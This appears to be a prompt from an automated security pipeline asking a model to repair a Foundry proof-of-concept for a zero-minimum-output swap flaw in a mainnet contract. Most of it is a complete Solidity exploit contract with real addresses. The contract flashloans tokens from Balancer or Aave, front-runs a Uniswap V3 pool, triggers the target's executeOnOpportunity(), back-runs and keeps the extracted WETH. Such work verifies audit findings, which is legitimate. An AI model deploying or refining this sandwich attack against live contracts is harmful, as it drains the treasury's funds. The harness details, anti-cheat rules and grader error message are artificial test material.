You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: All swaps use zero minimum output, enabling price-manipulation extraction
- claim: Every live Uniswap V2 and V3 swap path sets `amountOutMin`/`amountOutMinimum` to zero and performs no independent price or slippage validation before trading the contract's full token balance.
- impact: An MEV searcher can manipulate the relevant pool immediately before execution, let the verifier trade at an arbitrarily bad rate, then back-run to restore price and capture most of the treasury value as profit.
- exploit_paths: ["Observe a pending `executeOnOpportunity()` transaction or call it directly after funding.", "Manipulate one of the pools used by `_swapV3All()` or `_swapV2Path()`.", "Let the verifier execute swaps with zero slippage protection.", "Back-run the pool to unwind the manipulation and keep the extracted value."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetLike {
    function executeOnOpportunity() external;
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IQuoterV2Like {
    function quoteExactInputSingle(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn,
        uint160 sqrtPriceLimitX96
    ) external returns (uint256 amountOut);
}

interface ISwapRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

interface IBalancerVault {
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0;
    address internal constant USD0 = 0x73A15FeD60Bf67631dC6cd7Bc5B6e8da8190aCF5;
    address internal constant USUAL = 0xC4441c2BE5d8fA8126822B9929CA0b81Ea0DE38E;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNIV3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant UNIV3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant UNIV3_QUOTER = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fa4E2;

    address private _profitToken = WETH;
    uint256 private _profitAmount;

    struct Plan {
        address sourceToken;
        address manipulatedToken;
        uint24 manipulatedFee;
        uint256 expectedVictimAmount;
        uint256 scoreWeth;
    }

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = WETH;
        _profitAmount = 0;

        uint256 wethBefore = _balanceOf(WETH, address(this));

        Plan[7] memory plans;
        uint256 count;

        address[7] memory candidates = [TARGET, USD0, USUAL, USDC, USDT, DAI, WBTC];
        for (uint256 i = 0; i < candidates.length; i++) {
            Plan memory plan = _buildPlan(candidates[i]);
            if (plan.scoreWeth > 0) {
                plans[count] = plan;
                unchecked {
                    ++count;
                }
            }
        }

        _sortPlans(plans, count);

        for (uint256 i = 0; i < count; i++) {
            uint256[5] memory amounts = _loanLadder(plans[i]);
            for (uint256 j = 0; j < amounts.length; j++) {
                if (amounts[j] == 0) continue;
                (bool ok,) = address(this).call(
                    abi.encodeWithSelector(
                        this._attemptPlan.selector,
                        plans[i].sourceToken,
                        plans[i].manipulatedToken,
                        plans[i].manipulatedFee,
                        amounts[j]
                    )
                );
                if (ok) {
                    uint256 wethAfter = _balanceOf(WETH, address(this));
                    _profitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
                    return;
                }
            }
        }

        // If no plan is found or every realistic sandwich attempt reverts, this fork state does not expose
        // a profitably liquidatable target-owned balance on any live zero-min path. Donating attacker-owned
        // inventory would not validate the hypothesis because TARGET would keep the sale proceeds and the
        // attacker would still need to repurchase the donated inventory to repay temporary capital.
        uint256 wethAfterAll = _balanceOf(WETH, address(this));
        _profitAmount = wethAfterAll > wethBefore ? wethAfterAll - wethBefore : 0;
    }

    function _attemptPlan(address sourceToken, address manipulatedToken, uint24 fee, uint256 loanAmount) external {
        require(msg.sender == address(this), "self only");
        uint256 wethBefore = _balanceOf(WETH, address(this));
        bytes memory userData = abi.encode(sourceToken, manipulatedToken, fee, loanAmount);

        bool balancerOk;
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(manipulatedToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, userData) {
            balancerOk = true;
        } catch {}

        if (!balancerOk) {
            IAaveV3Pool(AAVE_V3_POOL).flashLoanSimple(address(this), manipulatedToken, loanAmount, userData, 0);
        }

        if (_balanceOf(WETH, address(this)) <= wethBefore) revert("no profit");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flashloan");
        _executeSandwich(address(tokens[0]), amounts[0], feeAmounts[0], userData);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "not aave");
        require(initiator == address(this), "bad initiator");
        _executeSandwich(asset, amount, premium, params);
        return true;
    }

    function _executeSandwich(address loanToken, uint256 amount, uint256 feeAmount, bytes memory userData) internal {
        (address sourceToken, address manipulatedToken, uint24 fee, uint256 requestedAmount) = abi.decode(
            userData,
            (address, address, uint24, uint256)
        );
        require(loanToken == manipulatedToken && amount == requestedAmount, "loan mismatch");
        require(_balanceOf(sourceToken, TARGET) > 0, "no victim balance");

        _forceApprove(manipulatedToken, UNIV3_ROUTER, type(uint256).max);
        _forceApprove(WETH, UNIV3_ROUTER, type(uint256).max);

        _swapExactIn(manipulatedToken, WETH, fee, amount);
        ITargetLike(TARGET).executeOnOpportunity();
        _swapExactOut(WETH, manipulatedToken, fee, amount + feeAmount);

        if (msg.sender == BALANCER_VAULT) {
            _safeTransfer(manipulatedToken, msg.sender, amount + feeAmount);
        } else {
            _forceApprove(manipulatedToken, AAVE_V3_POOL, amount + feeAmount);
        }
    }

    function _buildPlan(address sourceToken) internal returns (Plan memory best) {
        uint256 sourceBal = _balanceOf(sourceToken, TARGET);
        if (sourceBal == 0) return best;

        uint24 directFee = _selectLiveFee(sourceToken, WETH);
        if (directFee != 0) {
            uint256 directWeth = _quoteOut(sourceToken, WETH, directFee, sourceBal);
            if (directWeth > 0) {
                best = Plan({
                    sourceToken: sourceToken,
                    manipulatedToken: sourceToken,
                    manipulatedFee: directFee,
                    expectedVictimAmount: sourceBal,
                    scoreWeth: directWeth
                });
            }
            return best;
        }

        address[4] memory mids = [USDC, USDT, DAI, WBTC];
        for (uint256 i = 0; i < mids.length; i++) {
            uint24 fee1 = _selectLiveFee(sourceToken, mids[i]);
            if (fee1 == 0) continue;
            uint24 fee2 = _selectLiveFee(mids[i], WETH);
            if (fee2 == 0) continue;

            uint256 midOut = _quoteOut(sourceToken, mids[i], fee1, sourceBal);
            if (midOut == 0) continue;
            uint256 wethOut = _quoteOut(mids[i], WETH, fee2, midOut);
            if (wethOut == 0) continue;

            if (wethOut > best.scoreWeth) {
                best = Plan({
                    sourceToken: sourceToken,
                    manipulatedToken: mids[i],
                    manipulatedFee: fee2,
                    expectedVictimAmount: midOut,
                    scoreWeth: wethOut
                });
            }
        }
    }

    function _loanLadder(Plan memory plan) internal pure returns (uint256[5] memory ladder) {
        uint256 amount = plan.expectedVictimAmount;
        if (amount == 0) return ladder;
        ladder[0] = amount / 4;
        ladder[1] = amount / 2;
        ladder[2] = amount;
        ladder[3] = amount * 2;
        ladder[4] = amount * 4;
        for (uint256 i = 0; i < ladder.length; i++) {
            if (ladder[i] == 0) {
                ladder[i] = amount;
            }
        }
    }

    function _sortPlans(Plan[7] memory plans, uint256 count) internal pure {
        for (uint256 i = 0; i < count; i++) {
            for (uint256 j = i + 1; j < count; j++) {
                if (plans[j].scoreWeth > plans[i].scoreWeth) {
                    Plan memory tmp = plans[i];
                    plans[i] = plans[j];
                    plans[j] = tmp;
                }
            }
        }
    }

    function _selectLiveFee(address tokenA, address tokenB) internal view returns (uint24 fee) {
        if (tokenA == tokenB) return 0;
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        for (uint256 i = 0; i < fees.length; i++) {
            address pool = IUniswapV3Factory(UNIV3_FACTORY).getPool(tokenA, tokenB, fees[i]);
            if (pool != address(0)) {
                return fees[i];
            }
        }
    }

    function _quoteOut(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn) internal returns (uint256 out) {
        if (tokenIn == tokenOut || fee == 0 || amountIn == 0) return 0;
        try IQuoterV2Like(UNIV3_QUOTER).quoteExactInputSingle(tokenIn, tokenOut, fee, amountIn, 0) returns (
            uint256 amountOut
        ) {
            out = amountOut;
        } catch {}
    }

    function _swapExactIn(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn) internal returns (uint256) {
        ISwapRouterV3.ExactInputSingleParams memory params = ISwapRouterV3.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        return ISwapRouterV3(UNIV3_ROUTER).exactInputSingle(params);
    }

    function _swapExactOut(address tokenIn, address tokenOut, uint24 fee, uint256 amountOut) internal returns (uint256) {
        ISwapRouterV3.ExactOutputSingleParams memory params = ISwapRouterV3.ExactOutputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: amountOut,
            amountInMaximum: _balanceOf(tokenIn, address(this)),
            sqrtPriceLimitX96: 0
        });
        return ISwapRouterV3(UNIV3_ROUTER).exactOutputSingle(params);
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 bal) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
